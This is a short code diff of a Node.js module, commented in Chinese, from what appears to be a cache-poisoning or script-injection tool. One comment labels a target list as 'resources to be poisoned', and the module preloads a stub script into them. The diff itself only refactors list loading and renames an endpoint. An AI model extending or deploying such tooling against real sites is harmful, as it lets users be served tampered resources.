@@ -7,14 +7,19 @@ var STUB_SYMBOL = /\$URL_RAW/g,
 
 
 // 待投毒的资源列表
-var mTargetMap = require(FILE_TARGET),
-	mTargetBuf = new Buffer( JSON.stringify(mTargetMap) );
+var mTargetMap,
+	mTargetBuf;
 
 // 预加载的内容
 var mStubCode;
 
 
 exports.init = function(app) {
+
+	mTargetMap = require(FILE_TARGET);
+
+	var list = Object.keys(mTargetMap).join('\t');
+	mTargetBuf = new Buffer(list);
 
 	// 预加载的内容
 	mStubCode = app.util.readJs(FILE_STUB, app.param.debug);
@@ -35,9 +40,11 @@ function handleWebReqBegin(e) {
 	var req = e.clientReq;
 
 	// 请求下载列表
-	if (req.url == '/?!preload_list') {
-		e.output(200, {}, mTargetBuf);
-		return;
+	if (req.url == '/__preload_list__') {
+		e.output(200, {
+			'content-type': 'text/html'
+		}, mTargetBuf);
+		return false;
 	}
 
 	// 请求预加载资源
